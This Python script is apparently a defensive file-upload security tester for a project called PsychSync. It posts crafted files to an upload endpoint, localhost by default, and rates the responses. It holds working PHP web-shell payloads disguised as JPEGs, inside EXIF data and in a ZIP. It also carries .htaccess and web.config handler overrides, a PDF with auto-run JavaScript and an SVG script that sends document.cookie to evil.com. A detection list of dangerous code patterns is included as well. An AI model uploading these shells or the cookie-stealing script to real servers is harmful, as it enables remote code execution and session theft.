#!/usr/bin/env python3
"""
PsychSync File Upload Security Tester
Tests file upload functionality against various attack vectors
"""

import base64
import hashlib
import json
import mimetypes
import os
import sys
import tempfile
from dataclasses import dataclass
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests

# Add project root to path
sys.path.append(str(Path(__file__).parent.parent))


@dataclass
class FileUploadTestResult:
    """File upload security test result"""

    test_name: str
    file_type: str
    upload_attempt: str
    success: bool
    blocked: bool
    response_code: int
    response_body: str
    vulnerability_found: bool
    risk_level: str
    recommendations: List[str]


class FileUploadSecurityTester:
    """Comprehensive file upload security testing suite"""

    def __init__(
        self,
        base_url: str = "http://localhost:8000",
        upload_endpoint: str = "/api/v1/upload",
    ):
        self.base_url = base_url
        self.upload_endpoint = upload_endpoint
        self.results: List[FileUploadTestResult] = []
        self.temp_dir = Path(tempfile.mkdtemp())

        print("🔒 File Upload Security Tester Initialized")
        print(f"🎯 Target: {base_url}{upload_endpoint}")
        print(f"📁 Temp directory: {self.temp_dir}")

    def create_disguised_php_script(self) -> Path:
        """Create various disguised PHP scripts for testing"""

        # Test 1: PHP with .jpg extension
        php_jpg = self.temp_dir / "innocent_image.jpg"
        with open(php_jpg, "w") as f:
            f.write(
                """<?php
// Disguised PHP script
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>\xFF\xD8\xFF\xE0"""
            )  # Add JPEG magic bytes

        # Test 2: PHP with double extension
        php_double = self.temp_dir / "avatar.php.jpg"
        with open(php_double, "w") as f:
            f.write(
                """<?php
// Double extension bypass
echo "PHP Execution: ";
phpinfo();
?>"""
            )

        # Test 3: PHP with null byte injection
        php_null = self.temp_dir / "profile.jpg"
        with open(php_null, "wb") as f:
            f.write(b"<?php system($_GET['x']); ?>" + b"\x00" + b".jpg")

        # Test 4: PHP in ZIP archive
        import zipfile

        php_zip = self.temp_dir / "archive.zip"
        with zipfile.ZipFile(php_zip, "w") as zf:
            zf.writestr("shell.php", "<?php system($_POST['cmd']); ?>")

        return [php_jpg, php_double, php_null, php_zip]

    def create_exif_payload_image(self) -> Path:
        """Create image with malicious EXIF data"""

        # Create a valid JPEG with malicious EXIF comment
        exif_image = self.temp_dir / "photo_with_exif.jpg"

        # JPEG header with malicious EXIF comment
        jpeg_data = b"\xFF\xD8\xFF\xE1"  # JPEG with APP1 marker

        # EXIF segment with malicious payload
        exif_payload = b"""Exif\x00\x00II*\x00\x08\x00\x00\x00<?php if(isset($_REQUEST['c'])){system($_REQUEST['c']);}?>\x00\x00"""

        # Rest of JPEG data
        jpeg_end = b"\xFF\xFE" + b"A" * 1000 + b"\xFF\xD9"  # Comment + JPEG end

        with open(exif_image, "wb") as f:
            f.write(jpeg_data + exif_payload + jpeg_end)

        return exif_image

    def create_malicious_pdf(self) -> Path:
        """Create PDF with embedded malicious JavaScript"""

        malicious_pdf = self.temp_dir / "document.pdf"

        # PDF header with embedded JavaScript
        pdf_content = """%PDF-1.7
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
/OpenAction << /S /JavaScript /JS (app.alert('XSS in PDF'); this.exportDataObject(0, 'C');) >>
>>
endobj

2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj

3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
/Resources <<
/Font <<
/F1 5 0 R
>>
>>
>>
endobj

4 0 obj
<<
/Length 44
>>
stream
BT
/F1 12 Tf
72 720 Td
(Hello World) Tj
ET
endstream
endobj

5 0 obj
<<
/Type /Font
/Subtype /Type1
/BaseFont /Helvetica
>>
endobj

xref
0 6
0000000000 65535 f
0000000009 00000 n
0000000058 00000 n
0000000115 00000 n
0000000261 00000 n
0000000333 00000 n
trailer
<<
/Size 6
/Root 1 0 R
>>
startxref
423
%%EOF"""

        with open(malicious_pdf, "w") as f:
            f.write(pdf_content)

        return malicious_pdf

    def create_svg_with_script(self) -> Path:
        """Create SVG with embedded JavaScript"""

        svg_script = self.temp_dir / "logo.svg"
        svg_content = """<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
<script type="text/javascript">
    // Malicious JavaScript in SVG
    fetch('http://evil.com/steal?data=' + document.cookie);
    alert('SVG XSS executed');
</script>
</svg>"""

        with open(svg_script, "w") as f:
            f.write(svg_content)

        return svg_script

    def test_upload_file(
        self, file_path: Path, content_type: str = None
    ) -> Dict[str, Any]:
        """Test uploading a file and capture the response"""

        if not content_type:
            content_type, _ = mimetypes.guess_type(str(file_path))
            if not content_type:
                content_type = "application/octet-stream"

        try:
            with open(file_path, "rb") as f:
                files = {"file": (file_path.name, f, content_type)}

                # Test both multipart and JSON upload methods
                response = requests.post(
                    f"{self.base_url}{self.upload_endpoint}", files=files, timeout=10
                )

                return {
                    "status_code": response.status_code,
                    "headers": dict(response.headers),
                    "body": response.text,
                    "content_type": content_type,
                    "file_name": file_path.name,
                    "file_size": file_path.stat().st_size,
                }

        except requests.exceptions.RequestException as e:
            return {
                "status_code": 0,
                "error": str(e),
                "body": str(e),
                "content_type": content_type,
                "file_name": file_path.name,
                "file_size": file_path.stat().st_size,
            }

    def analyze_upload_response(
        self, response_data: Dict[str, Any], test_name: str
    ) -> FileUploadTestResult:
        """Analyze upload response to detect security vulnerabilities"""

        status_code = response_data.get("status_code", 0)
        body = response_data.get("body", "")
        file_name = response_data.get("file_name", "")

        # Determine if upload was successful
        upload_successful = status_code in [200, 201, 202]

        # Determine if upload was blocked
        upload_blocked = (
            status_code in [400, 403, 413, 415, 422] or "error" in body.lower()
        )

        # Check for vulnerability indicators
        vulnerability_found = False
        risk_level = "LOW"
        recommendations = []

        # Check for dangerous patterns in response
        dangerous_patterns = [
            "exec(",
            "system(",
            "eval(",
            "shell_exec(",
            "<script",
            "javascript:",
            "vbscript:",
            "<?php",
            "<% ",
            "eval$_POST",
        ]

        for pattern in dangerous_patterns:
            if pattern in body:
                vulnerability_found = True
                risk_level = "CRITICAL"
                recommendations.append(
                    f"Server response contains dangerous code pattern: {pattern}"
                )
                break

        # Check if file execution is possible
        if upload_successful and any(
            ext in file_name.lower() for ext in [".php", ".phtml", ".php5"]
        ):
            vulnerability_found = True
            risk_level = "HIGH"
            recommendations.append(
                "PHP file upload allowed - potential RCE vulnerability"
            )

        # Check for file type bypass
        if (
            upload_successful
            and ".jpg" in file_name
            and "<?php" in open(self.temp_dir / file_name).read()
        ):
            vulnerability_found = True
            risk_level = "HIGH"
            recommendations.append(
                "File type validation bypassed - disguised PHP uploaded"
            )

        # Check response headers for security issues
        headers = response_data.get("headers", {})
        if "X-Debug" in headers or "X-Powered-By" in headers:
            recommendations.append("Response headers expose server information")
            if risk_level == "LOW":
                risk_level = "MEDIUM"

        if not recommendations:
            if upload_blocked:
                recommendations.append("File upload properly blocked")
                risk_level = "SAFE"
            else:
                recommendations.append("Monitor uploaded files for malicious content")
                risk_level = "MEDIUM"

        return FileUploadTestResult(
            test_name=test_name,
            file_type=response_data.get("content_type", "unknown"),
            upload_attempt=file_name,
            success=upload_successful,
            blocked=upload_blocked,
            response_code=status_code,
            response_body=body[:500],  # Limit response length
            vulnerability_found=vulnerability_found,
            risk_level=risk_level,
            recommendations=recommendations,
        )

    def test_disguised_php_uploads(self):
        """Test uploading disguised PHP scripts"""

        print("\n🔍 Testing Disguised PHP Script Uploads...")
        print("=" * 60)

        php_files = self.create_disguised_php_script()

        test_cases = [
            ("PHP disguised as JPEG", php_files[0], "image/jpeg"),
            ("PHP with double extension", php_files[1], "image/jpeg"),
            ("PHP with null byte injection", php_files[2], "image/jpeg"),
            ("PHP in ZIP archive", php_files[3], "application/zip"),
        ]

        for test_name, file_path, content_type in test_cases:
            print(f"\n📤 Testing: {test_name}")
            response = self.test_upload_file(file_path, content_type)
            result = self.analyze_upload_response(response, test_name)
            self.results.append(result)

            status_icon = (
                "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
            )
            print(f"   {status_icon} Status: {result.risk_level}")
            print(f"   📄 File: {result.upload_attempt}")
            print(f"   🔄 Response: {result.response_code}")

            for rec in result.recommendations:
                print(f"   💡 {rec}")

    def test_exif_payload_injection(self):
        """Test image with malicious EXIF data"""

        print("\n🖼️ Testing EXIF Payload Injection...")
        print("=" * 60)

        exif_image = self.create_exif_payload_image()

        print(f"\n📤 Testing: Image with malicious EXIF data")
        response = self.test_upload_file(exif_image, "image/jpeg")
        result = self.analyze_upload_response(response, "EXIF Payload Injection")
        self.results.append(result)

        status_icon = (
            "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
        )
        print(f"   {status_icon} Status: {result.risk_level}")
        print(f"   📄 File: {result.upload_attempt}")
        print(f"   🔄 Response: {result.response_code}")

        # Check if EXIF data is processed
        if "EXIF" in response.get("body", "") or result.success:
            result.vulnerability_found = True
            result.risk_level = "HIGH"
            result.recommendations.append(
                "EXIF data processed - potential code execution"
            )

        for rec in result.recommendations:
            print(f"   💡 {rec}")

    def test_pdf_script_injection(self):
        """Test PDF with embedded JavaScript"""

        print("\n📄 Testing PDF Script Injection...")
        print("=" * 60)

        malicious_pdf = self.create_malicious_pdf()

        print(f"\n📤 Testing: PDF with embedded JavaScript")
        response = self.test_upload_file(malicious_pdf, "application/pdf")
        result = self.analyze_upload_response(response, "PDF Script Injection")
        self.results.append(result)

        status_icon = (
            "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
        )
        print(f"   {status_icon} Status: {result.risk_level}")
        print(f"   📄 File: {result.upload_attempt}")
        print(f"   🔄 Response: {result.response_code}")

        # Check for PDF processing
        if "PDF" in response.get("body", "") or result.success:
            result.recommendations.append(
                "PDF uploaded - verify JavaScript sanitization"
            )
            if "JavaScript" not in response.get("body", ""):
                result.vulnerability_found = True
                result.risk_level = "HIGH"
                result.recommendations.append(
                    "PDF JavaScript may not be sanitized - XSS risk"
                )

        for rec in result.recommendations:
            print(f"   💡 {rec}")

    def test_svg_script_injection(self):
        """Test SVG with embedded JavaScript"""

        print("\n🎨 Testing SVG Script Injection...")
        print("=" * 60)

        svg_script = self.create_svg_with_script()

        print(f"\n📤 Testing: SVG with embedded JavaScript")
        response = self.test_upload_file(svg_script, "image/svg+xml")
        result = self.analyze_upload_response(response, "SVG Script Injection")
        self.results.append(result)

        status_icon = (
            "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
        )
        print(f"   {status_icon} Status: {result.risk_level}")
        print(f"   📄 File: {result.upload_attempt}")
        print(f"   🔄 Response: {result.response_code}")

        # Check for SVG processing
        if result.success and "svg" in response.get("body", "").lower():
            result.vulnerability_found = True
            result.risk_level = "HIGH"
            result.recommendations.append(
                "SVG with JavaScript processed - XSS vulnerability"
            )

        for rec in result.recommendations:
            print(f"   💡 {rec}")

    def test_file_type_filtering(self):
        """Test various file type filtering weaknesses"""

        print("\n🔍 Testing File Type Filtering...")
        print("=" * 60)

        # Test cases for filtering bypass
        test_files = [
            (
                "Web Shell",
                "shell.php",
                "<?php system($_GET['cmd']); ?>",
                "application/x-php",
            ),
            (
                ".htaccess",
                ".htaccess",
                "AddType application/x-httpd-php .jpg",
                "text/plain",
            ),
            (
                "Web Config",
                "web.config",
                '<?xml version="1.0"?><system.webServer><handlers add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" scriptProcessor="C:\\php\\php-cgi.exe" /></system.webServer>',
                "application/xml",
            ),
            ("INI File", "php.ini", "allow_url_include = On", "text/plain"),
            ("Bash Script", "script.sh", "#!/bin/bash\nwhoami", "application/x-sh"),
        ]

        for test_name, filename, content, content_type in test_files:
            test_file = self.temp_dir / filename
            with open(test_file, "w") as f:
                f.write(content)

            print(f"\n📤 Testing: {test_name}")
            response = self.test_upload_file(test_file, content_type)
            result = self.analyze_upload_response(
                response, f"File Filtering - {test_name}"
            )
            self.results.append(result)

            status_icon = (
                "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
            )
            print(f"   {status_icon} Status: {result.risk_level}")
            print(f"   📄 File: {result.upload_attempt}")
            print(f"   🔄 Response: {result.response_code}")

            for rec in result.recommendations:
                print(f"   💡 {rec}")

    def test_oversized_file(self):
        """Test oversized file upload"""

        print("\n📏 Testing Oversized File Upload...")
        print("=" * 60)

        # Create a large file (10MB)
        large_file = self.temp_dir / "large_file.jpg"
        with open(large_file, "wb") as f:
            f.write(b"A" * 10 * 1024 * 1024)  # 10MB of data

        print(f"\n📤 Testing: 10MB file upload")
        response = self.test_upload_file(large_file, "image/jpeg")
        result = self.analyze_upload_response(response, "Oversized File Upload")
        self.results.append(result)

        status_icon = (
            "✅" if result.blocked else "🚨" if result.vulnerability_found else "⚠️"
        )
        print(f"   {status_icon} Status: {result.risk_level}")
        print(f"   📄 File: {result.upload_attempt} ({result.response_code})")

        if result.success:
            result.vulnerability_found = True
            result.risk_level = "HIGH"
            result.recommendations.append(
                "Large file upload allowed - potential DoS vulnerability"
            )

        for rec in result.recommendations:
            print(f"   💡 {rec}")

    def generate_report(self) -> Dict[str, Any]:
        """Generate comprehensive security test report"""

        # Calculate statistics
        total_tests = len(self.results)
        vulnerabilities_found = len([r for r in self.results if r.vulnerability_found])
        blocked_uploads = len([r for r in self.results if r.blocked])
        successful_uploads = len([r for r in self.results if r.success])

        # Risk level breakdown
        risk_counts = {}
        for result in self.results:
            risk_counts[result.risk_level] = risk_counts.get(result.risk_level, 0) + 1

        # Generate recommendations
        all_recommendations = []
        for result in self.results:
            all_recommendations.extend(result.recommendations)

        # Remove duplicates and prioritize
        unique_recommendations = list(set(all_recommendations))
        critical_recommendations = [
            r
            for r in unique_recommendations
            if "critical" in r.lower() or "rce" in r.lower()
        ]

        overall_risk_level = "LOW"
        if risk_counts.get("CRITICAL", 0) > 0:
            overall_risk_level = "CRITICAL"
        elif risk_counts.get("HIGH", 0) > 0:
            overall_risk_level = "HIGH"
        elif risk_counts.get("MEDIUM", 0) > 0:
            overall_risk_level = "MEDIUM"

        return {
            "scan_timestamp": datetime.now().isoformat(),
            "target_url": f"{self.base_url}{self.upload_endpoint}",
            "overall_risk_level": overall_risk_level,
            "statistics": {
                "total_tests": total_tests,
                "vulnerabilities_found": vulnerabilities_found,
                "blocked_uploads": blocked_uploads,
                "successful_uploads": successful_uploads,
                "risk_level_breakdown": risk_counts,
            },
            "test_results": [
                {
                    "test_name": result.test_name,
                    "file_type": result.file_type,
                    "upload_attempt": result.upload_attempt,
                    "success": result.success,
                    "blocked": result.blocked,
                    "response_code": result.response_code,
                    "vulnerability_found": result.vulnerability_found,
                    "risk_level": result.risk_level,
                    "recommendations": result.recommendations,
                }
                for result in self.results
            ],
            "critical_recommendations": critical_recommendations,
            "all_recommendations": unique_recommendations,
        }

    def run_comprehensive_test(self) -> Dict[str, Any]:
        """Run all file upload security tests"""

        print("🚀 Starting Comprehensive File Upload Security Test")
        print("=" * 80)

        try:
            # Run all test categories
            self.test_disguised_php_uploads()
            self.test_exif_payload_injection()
            self.test_pdf_script_injection()
            self.test_svg_script_injection()
            self.test_file_type_filtering()
            self.test_oversized_file()

            # Generate and return report
            report = self.generate_report()

            print("\n" + "=" * 80)
            print("📊 File Upload Security Test Results")
            print("=" * 80)

            stats = report["statistics"]
            print(f"🎯 Overall Risk Level: {report['overall_risk_level']}")
            print(f"📋 Total Tests: {stats['total_tests']}")
            print(f"🚨 Vulnerabilities Found: {stats['vulnerabilities_found']}")
            print(f"🚫 Blocked Uploads: {stats['blocked_uploads']}")
            print(f"✅ Successful Uploads: {stats['successful_uploads']}")

            print(f"\n📈 Risk Level Breakdown:")
            for risk_level, count in stats["risk_level_breakdown"].items():
                print(f"   {risk_level}: {count}")

            if report["critical_recommendations"]:
                print(f"\n🚨 Critical Recommendations:")
                for i, rec in enumerate(report["critical_recommendations"], 1):
                    print(f"   {i}. {rec}")

            # Save report
            report_file = f"file_upload_security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(report_file, "w") as f:
                json.dump(report, f, indent=2)

            print(f"\n📄 Detailed report saved: {report_file}")

            return report

        finally:
            # Cleanup temp directory
            import shutil

            shutil.rmtree(self.temp_dir)


def main():
    """Main CLI interface"""
    import argparse

    parser = argparse.ArgumentParser(description="File Upload Security Tester")
    parser.add_argument(
        "--url", default="http://localhost:8000", help="Target base URL"
    )
    parser.add_argument("--endpoint", default="/api/v1/upload", help="Upload endpoint")
    parser.add_argument(
        "--test",
        choices=["php", "exif", "pdf", "svg", "filtering", "oversized"],
        help="Run specific test",
    )

    args = parser.parse_args()

    tester = FileUploadSecurityTester(args.url, args.endpoint)

    if args.test == "php":
        tester.test_disguised_php_uploads()
    elif args.test == "exif":
        tester.test_exif_payload_injection()
    elif args.test == "pdf":
        tester.test_pdf_script_injection()
    elif args.test == "svg":
        tester.test_svg_script_injection()
    elif args.test == "filtering":
        tester.test_file_type_filtering()
    elif args.test == "oversized":
        tester.test_oversized_file()
    else:
        # Run comprehensive test
        report = tester.run_comprehensive_test()

        # Exit with appropriate code based on findings
        if report["overall_risk_level"] in ["CRITICAL", "HIGH"]:
            sys.exit(1)
        elif report["overall_risk_level"] == "MEDIUM":
            sys.exit(2)
        else:
            sys.exit(0)


if __name__ == "__main__":
    main()
